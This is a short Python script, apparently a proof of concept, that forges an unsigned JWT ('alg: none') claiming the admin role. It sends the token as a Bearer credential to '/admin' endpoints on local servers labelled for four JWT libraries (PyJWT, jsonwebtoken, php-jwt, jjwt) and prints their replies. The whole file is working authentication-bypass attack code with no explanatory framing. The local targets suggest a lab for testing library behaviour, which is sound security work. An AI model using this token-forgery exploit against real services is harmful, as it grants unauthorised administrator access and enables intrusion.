import base64, json, requests

def b64_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

header = b64_encode({"alg": "none", "typ": "JWT"})
payload = b64_encode({"user": "testuser", "role": "admin", "exp": 9999999999})
forged_token = f"{header}.{payload}."

targets = {
    "PyJWT":         ("http://localhost:5000/admin",  "GET"),
    "jsonwebtoken":  ("http://localhost:3000/admin",  "GET"),
    "php-jwt":       ("http://localhost:8080/admin",  "GET"),
    "jjwt":          ("http://localhost:8081/admin",  "GET"),
}

for name, (url, method) in targets.items():
    r = requests.request(method, url, headers={'Authorization': f'Bearer {forged_token}'})
    print(f"{name}: {r.json()}")